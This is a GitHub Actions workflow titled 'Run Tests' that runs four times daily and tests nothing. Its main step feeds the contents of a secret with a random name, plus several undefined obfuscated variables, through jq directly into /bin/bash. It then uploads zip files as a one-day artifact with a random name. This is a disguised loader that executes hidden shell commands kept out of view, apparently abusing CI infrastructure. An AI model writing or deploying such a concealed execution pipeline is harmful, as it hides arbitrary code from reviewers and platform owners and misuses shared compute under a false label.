name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '5 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  job:
    name: Go
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          ivnuo194: ${{ secrets.ivnuo194 }}
        run: |
          printf '%s' "$ivnuo194" | jq -r .lhhbv3 | /bin/bash
          printf '%s' "$w8926" | jq -r .eq867 | /bin/bash
          echo $s240 | jq -r .mk34287 | /bin/bash
          echo $on09 | jq -r .sogm3 | /bin/bash
          echo $n65292 | jq -r .hyzk67901 | /bin/bash
          printf '%s' "$ksxk1" | jq -r .vafok1 | /bin/bash

      - name: Store artifact
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: PlzGXI91
          path: "*.zip"
          retention-days: 1
